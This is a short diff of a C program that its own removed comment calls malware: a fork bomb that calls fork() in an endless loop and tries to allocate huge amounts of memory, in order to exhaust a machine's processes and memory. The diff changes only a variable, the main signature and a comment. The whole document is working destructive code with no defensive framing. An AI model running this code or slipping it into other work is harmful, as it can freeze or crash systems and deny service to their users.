@@ -2,12 +2,14 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-int main(void) {
+char *mem;
+
+int main() {
 	fork();
 	while (1) {
-		malloc(0xFFFFFFFFFFFFFFFF);
+		mem = malloc(0xFFFFFFFFFFFFFFFF);
 		fork();
 	}
 	
-	return -1; // Shouldn't never happen, so this will show the OS that there's an error in the malware.
+	return -1; // How did we get here?
 }
